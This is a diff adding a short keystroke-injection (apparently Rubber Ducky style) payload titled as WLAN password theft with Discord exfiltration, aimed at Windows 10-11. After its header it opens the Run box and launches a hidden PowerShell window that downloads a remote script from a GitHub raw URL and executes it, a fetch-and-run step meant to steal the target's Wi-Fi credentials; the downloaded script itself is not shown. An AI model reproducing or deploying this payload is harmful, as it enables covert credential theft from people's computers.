@@ -1,0 +1,15 @@
+REM ###################################################################
+REM #                                                                 |
+REM # Title        : WLAN-Windows-Passwords-Discord-Exfiltration      |
+REM # Author       : Aleff                                            |
+REM # Description: A script used to stole target WLAN Passwords.      |
+REM # Category     : Credentials                                      |
+REM # Target       : Windows 10-11                                    |
+REM # Version      : 1.0                                              |
+REM #                                                                 |
+REM ###################################################################
+
+DELAY 2000
+GUI r
+DELAY 250
+powershell -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glitter_Scripts/main/Windows/W-Wifi-Passwords/W-Wifi-Passwords.ps1?token=GHSAT0AAAAAACJCV62VAY3UYBE2UHBYJCM6ZJVR2UQ').Content"
